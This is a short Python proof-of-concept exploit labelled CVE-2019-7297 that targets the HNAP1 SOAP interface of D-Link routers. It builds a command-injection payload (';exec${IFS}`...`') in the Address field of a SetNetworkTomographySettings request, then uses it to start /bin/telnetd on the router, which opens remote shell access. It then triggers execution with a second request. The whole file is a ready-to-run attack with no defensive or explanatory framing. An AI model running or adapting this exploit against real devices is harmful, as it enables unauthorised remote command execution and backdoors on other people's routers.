POC/CVE-2019-7297.py

# -*- coding: utf-8 -*-
# @File  : opentelnet.py
# @Author: TT
# @Email : tt.jiaqi@gmail.com
# @Date  : 2018/11/4
# @Desc  : open route Telnet server

# python3
# pip install request -i https://pypi.douban.com/simple


import requests
import time

def exec_commend():
    url = "http://dlinkrouter.com/HNAP1/"
    headers = {"SOAPAction": 'http://purenetworks.com/HNAP1/GetNetworkTomographyResult',
               "Content-Type": "application/xml"}
    xml = """<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
    xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>
    <GetNetworkTomographyResult xmlns="http://purenetworks.com/HNAP1/" /></soap:Body></soap:Envelope>"""
    r = requests.post(url=url, headers=headers, data=xml)
    print(r.text)


def set_command(command):
    url = "http://dlinkrouter.com/HNAP1/"
    headers = {"SOAPAction" : 'http://purenetworks.com/HNAP1/SetNetworkTomographySettings',"Content-Type" : "application/xml"}
    xml1 = """
    <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
    xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>
    <SetNetworkTomographySettings xmlns="http://purenetworks.com/HNAP1/"><Address>;exec${IFS}`"""
    xml2 = "{0}".format(command)
    xml3 = """`</Address><Number>4</Number><Size>4</Size></SetNetworkTomographySettings></soap:Body></soap:Envelope>"""
    print(xml1+xml2+xml3)
    r = requests.post(url=url, headers=headers, data=xml1+xml2+xml3)
    print(r.text)


if __name__ == "__main__":
    set_command("/bin/telnetd")
    exec_commend()

